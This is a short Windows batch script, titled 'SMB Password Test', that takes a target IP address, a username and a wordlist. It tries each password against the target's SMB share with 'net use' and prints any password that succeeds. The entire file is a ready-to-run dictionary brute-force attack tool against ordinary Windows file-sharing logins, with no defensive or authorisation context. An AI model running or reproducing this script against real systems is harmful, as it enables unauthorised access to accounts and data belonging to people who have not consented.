@echo off
title SMB Password Test
setlocal EnableDelayedExpansion

:: Get input parameters
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

:: Verify input file exists
if not exist "%wordlist%" (
    echo Error: Password list file not found
    pause
    exit /b 1
)

echo Testing passwords for \\%ip% with username %user%
echo Starting at %time%
echo.

:: Clean any existing connections
net use \\%ip% /d /y >nul 2>&1

:: Test each password
for /f "usebackq delims=" %%a in ("%wordlist%") do (
    set "pass=%%a"
    call :attempt "!pass!"
)

echo.
echo Password not found in list
echo Finished at %time%
pause
exit /b 1

:success
echo.
echo Password Found: %~1
echo Time found: %time%
net use \\%ip% /d /y >nul 2>&1
pause
exit /b 0

:attempt
echo Testing password: %~1
net use \\%ip% /user:%user% "%~1" >nul 2>&1
if !errorlevel! equ 0 (
    call :success "%~1"
    exit /b 0
)
net use \\%ip% /d /y >nul 2>&1
exit /b 1